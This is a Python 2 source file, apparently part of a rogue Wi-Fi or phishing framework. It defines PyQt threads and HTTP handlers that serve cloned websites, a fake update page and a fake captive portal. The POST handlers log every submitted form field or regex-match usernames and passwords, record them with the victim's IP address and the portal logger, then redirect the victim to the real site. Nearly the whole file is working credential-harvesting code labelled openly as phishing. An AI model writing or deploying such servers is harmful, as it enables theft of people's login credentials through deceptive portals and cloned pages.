from PyQt4.QtCore import QThread,pyqtSignal
from core.utils import setup_logger
from core.utility.constants import LOG_PHISHING,LOG_CAPTIVEPORTALPROXY
import SimpleHTTPServer
import BaseHTTPServer
import SocketServer
import threading
import urllib2
import logging
import socket
import cgi
import re


class ServerHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    ''' server http for website clone module Phishing'''
    redirect_Original_website,redirect_Path = None,None
    def do_GET(self):
        self.log_message('',"Connected : %s" %(self.address_string()))
        if self.path =='/':self.path = self.redirect_Path
        if self.path.startswith('/'): self.path = self.redirect_Path + self.path
        SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)

    def log_message(self, format, *args):
        return

    def redirect(self, page="/"):
        if not page.startswith('http://'):
            page = 'http://' + page
        self.send_response(301)
        self.send_header('Location', page)
        self.end_headers()

    def do_POST(self):
        redirect = False
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={'REQUEST_METHOD':'POST',
            'CONTENT_TYPE':self.headers['Content-Type'],
            }
        )
        if not form.list: return
        redirect = True
        for item in form.list:
            if item.name and item.value:
                self.log_message('',item.name+' : '+item.value)
        if redirect:
            self.redirect(self.redirect_Original_website)
        SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)

class ServerPhishing(SimpleHTTPServer.SimpleHTTPRequestHandler):
    ''' server http for website clone module Phishing'''
    redirect_Path = None,None
    def do_GET(self):
        self.log_message('',"Connected : %s" %(self.address_string()))
        if self.path =='/':self.path = self.redirect_Path
        if self.path.startswith('/'): self.path = self.redirect_Path + self.path
        SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)

    def log_message(self, format, *args): return

class MyHTTPServer(BaseHTTPServer.HTTPServer):
    ''' by: Piotr Dobrogost callback for start and stop event '''
    def __init__(self, *args, **kwargs):
        self.on_before_serve = kwargs.pop('on_before_serve', None)
        BaseHTTPServer.HTTPServer.__init__(self, *args, **kwargs)

    def serve_forever(self, poll_interval=0.5):
        if self.on_before_serve:
            self.on_before_serve(self)
        BaseHTTPServer.HTTPServer.serve_forever(self, poll_interval)

class ThreadHTTPServerPhishing(QThread):
    ''' server http for website  module::UpdateFake'''
    request = pyqtSignal(object)
    def __init__(self,PORT,DIRECTORY,parent=None):
        super(ThreadHTTPServerPhishing, self).__init__(parent)
        self.PORT,self.DIRECTORY = PORT,DIRECTORY

    def run(self):
        self.httpd = None
        self.Handler = ServerPhishing
        self.Handler.redirect_Path = self.DIRECTORY
        self.Handler.log_message = self.Method_GET_REQUEST
        self.httpd = MyHTTPServer(('', self.PORT), self.Handler,
        on_before_serve = self.httpd)
        self.httpd.allow_reuse_address = True
        self.httpd.serve_forever()

    def Method_GET_REQUEST(self,format, *args ):
        self.request.emit('{}'.format(list(args)[0]))

    def stop(self):
        try:
            self.httpd.shutdown()
            self.httpd.server_close()
        except AttributeError: pass

class ServerThreadHTTP(QThread):
    ''' server http for website custom module Phishing '''
    requestHTTP = pyqtSignal(object)
    def __init__(self,Address,PORT,redirect=None,directory=None,session=str()):
        self.Address,self.PORT = Address,PORT
        self.session = session
        self.Handler = ServerHandler
        self.Handler.redirect_Original_website = redirect
        self.Handler.redirect_Path = directory
        QThread.__init__(self)

    def run(self):
        self.httpd = None
        self.httpd = MyHTTPServer((self.Address, self.PORT), self.Handler,on_before_serve = self.httpd)
        self.Handler.log_message = self.Method_GET_LOG
        setup_logger('phishing', LOG_PHISHING, key=self.session)
        self.log_phishing = logging.getLogger('phishing')
        self.httpd.serve_forever()

    def Method_GET_LOG(self,format, *args):
        self.log_phishing.info(list(args)[0])
        self.requestHTTP.emit(list(args)[0])

    def stop(self):
        try:
            self.httpd.shutdown()
            self.httpd.server_close()
        except AttributeError: pass



class ThreadCaptivePortalHTTPServer(QThread):
    ''' server http for website custom module Phishing '''
    requestCredentails = pyqtSignal(object)
    requestLogin = pyqtSignal(object)
    def __init__(self,Address,PORT,plugin=None,session=str()):
        self.Address,self.PORT = Address,PORT
        self.session = session
        self.Handler = ServerHandlerCaptivePortal
        self.Handler.redirect_Original_website = plugin.Redirect
        self.Handler.redirect_Path = plugin.TemplatePath
        QThread.__init__(self)

    def run(self):
        self.httpd = None
        #self.httpd = MyHTTPServer((self.Address, self.PORT), self.Handler,on_before_serve = self.httpd)
        self.Handler.log_message_creds = self.Method_POST_DATA
        self.Handler.log_message_post = self.Mehtod_POST_LOG
        setup_logger('captivePortal', LOG_CAPTIVEPORTALPROXY, key=self.session)
        self.log_captiveportal = logging.getLogger('captivePortal')
        #self.httpd.serve_forever()

    def Method_POST_DATA(self,format, *args):
        self.log_captiveportal.info(list(args)[0])
        self.requestCredentails.emit(list(args)[0])

    def Mehtod_POST_LOG(self, format, *args):
        self.requestLogin.emit(list(args)[0])

    def stop(self):
        try:
            self.httpd.shutdown()
            self.httpd.server_close()
        except AttributeError: pass



class ServerHandlerCaptivePortal(SimpleHTTPServer.SimpleHTTPRequestHandler):
    ''' server http for website clone module Phishing'''
    redirect_Original_website,redirect_Path = None,None
    
    def do_GET(self):
        if self.path =='/':self.path = self.redirect_Path
        if self.path.startswith('/'): self.path = self.redirect_Path + self.path
        SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)

    def log_message_creds(self, format, *args):
        return

    def log_message_post(self, format, *args):
        return

    def log_message(self, format, *args):
        return

    def redirect(self, page="/"):

        # https://stackoverflow.com/questions/7160737/python-how-to-validate-a-url-in-python-malformed-or-not
        regex = re.compile(r'^(?:http|ftp)s?://' # http:// or https://
        r'(?:(?:[A-Z0-9](?:[A-Z0-9-]{0,61}[A-Z0-9])?\.)+(?:[A-Z]{2,6}\.?|[A-Z0-9-]{2,}\.?)|' #domain...
        r'localhost|' #localhost...
        r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})' # ...or ip
        r'(?::\d+)?' # optional port
        r'(?:/?|[/?]\S+)$', re.IGNORECASE)

        if  re.match(regex, page):
            if not page.startswith('http://'):
                page = 'http://' + page
            self.send_response(301)
            self.send_header('Location', page)
            self.end_headers()
        else:
            self.path = self.redirect_Path + self.path + self.redirect_Original_website

    def do_POST(self):
        redirect = False
        
        try:
            content_length = int(self.headers['Content-Length']) 
            post_data = self.rfile.read(content_length) 
            print(post_data)


            user_regex = '([Ee]mail|%5B[Ee]mail%5D|[Uu]ser|[Uu]sername|' \
            '[Nn]ame|[Ll]ogin|[Ll]og|[Ll]ogin[Ii][Dd])=([^&|;]*)'
            pw_regex = '([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp][Ss][Ww]|' \
            '[Pp]asswrd|[Pp]assw|%5B[Pp]assword%5D)=([^&|;]*)'
            username = re.findall(user_regex, post_data)
            password = re.findall(pw_regex, post_data)

            if not username ==[] and not password == []:
                self.log_message_creds('',{'CaptiveCreds':{'User':username[0][1],
                'Pass': password[0][1], 'Client': self.client_address[0]}})
                redirect = True
        except:
            pass

        # form = cgi.FieldStorage(
        #     fp=self.rfile,
        #     headers=self.headers,
        #     environ={'REQUEST_METHOD':'POST',
        #     'CONTENT_TYPE':self.headers['Content-Type'],
        #     }
        # )

        # if not form.list: return
        # redirect = True
        # for item in form.list:
        #     if item.name and item.value:
        #         self.log_message('',item.name+' : '+item.value)
        if redirect:
             # send confirmation the cliente this to access to server
            self.log_message_post('', self.client_address[0])
            self.redirect(self.redirect_Original_website)
        SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)